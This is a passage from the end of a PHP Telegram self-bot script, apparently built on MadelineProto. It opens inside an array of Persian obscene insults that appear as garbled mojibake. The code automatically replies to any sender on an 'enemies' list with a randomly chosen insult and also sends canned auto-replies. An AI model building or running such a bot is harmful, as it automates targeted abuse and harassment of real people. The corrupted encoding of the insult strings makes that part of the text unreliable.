Ú©ÙÙÛ","Ø®Ø§Ø±Ú©ØµØªÙ Û Ø¨Û ØºÛØ±Øª","Ø´Ø±Ù Ú©Ù Ø¨ÛÙØ§ÙÙØ³","ÙØ§ÙØ§ÙØªÙ Ú©Ø±Ø¯ ","Ø§Û ÙØ§Ø¯Ø±Ø¬ÙØ¯Ù","Ø¨ÛØºÛØ±Øª","Ú©ÛØ±ØªÙ ÙØ§ÙÙØµØª","Ø¨ÛÙØ§ÙÙØ³ ÙÙÛØ®Ø§Û Ø§Ù Ø¨Ø´ÛØ","Ø§Û Ø®Ø§Ø±Ú©ÙØµØªÙ","ÙØ§ÙØ´Ù Ø¯ÛÚ¯Ù","ÙÙÙ Ú©Ø³ Ú©ÙÙÛ","Ø­Ø±Ø§ÙØ²Ø§Ø¯Ù","ÙØ§Ø¯Ø±ØªÙ ÙÛÚ©ÙÙ","Ø¨ÛÙØ§ÙÙØ³","Ú©ØµØ´Ø±","Ø§Ù Ø´Ù ÙØ§Ø¯Ø±Ú©ÙØµØªÙ","Ø®Ø§Ø±Ú©ØµØªÙ Ú©Ø¬Ø§ÛÛ","ÙÙØªÙ Ú©Ø±Ø¯Ù Ú©Ø§Ø±Û ÙÙÛÚ©ÙÛØ","Ú©ÛØ±ØªÙ ÙØ§Ø¯Ø±Øª ÙØ§Ù","Ú©ÛØ±ØªÙ ÙÙØª Ø¨Ø³Ù","Ú©ÛØ±ØªÙ Ø´Ø±ÙØª","ÙØ§Ø¯Ø±ØªÙ ÙÛÚ¯Ø§Ù Ø¨Ø§ÙØ§","Ú©ÛØ± ØªÙ ÙØ§Ø¯Ø±Øª"
  ];
if(in_array($from_id, $data['enemies'])){
  $f = $fohsh[rand(0, count($fohsh)-1)];
  $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => $f, 'reply_to_msg_id' => $msg_id]);
}
if(isset($data['answering'][$text])){
  $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => $data['answering'][$text] , 'reply_to_msg_id' => $msg_id]);
    }
   }
  }
 }
} catch(\Exception $e){}	catch(\danog\MadelineProto\RPCErrorException $e){}
 }
}

// Madeline Tools
register_shutdown_function('shutdown_function', $lock);
closeConnection();
$MadelineProto->async(true);
$MadelineProto->loop(function () use ($MadelineProto) {
  yield $MadelineProto->setEventHandler('\EventHandler');
});
$MadelineProto->loop();
?>